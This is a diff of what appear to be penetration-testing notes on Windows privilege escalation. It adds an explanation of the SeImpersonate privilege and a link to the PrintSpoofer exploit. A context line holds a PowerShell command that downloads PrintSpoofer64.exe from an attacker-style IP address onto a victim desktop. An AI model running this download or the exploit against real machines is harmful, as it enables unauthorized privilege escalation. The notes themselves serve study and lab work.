@@ -1616,6 +1616,8 @@ iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\Prin
 
 --------------
 
+- An account that has the SeImpersonate privilege enabled has the ability to impersonate another client after authentication. This means that this privilege allows the account to impersonate other accounts, so long as they have authenticated. Whenever a user authenticates to a host, a token (logon sessions inside the LSASS process) resides on the system until the next restart.
+ 
 - Exploit [link](https://github.com/itm4n/PrintSpoofer)-:
 
 ![image](https://github.com/user-attachments/assets/b395626c-692b-4164-8d29-5a96b42d3795)
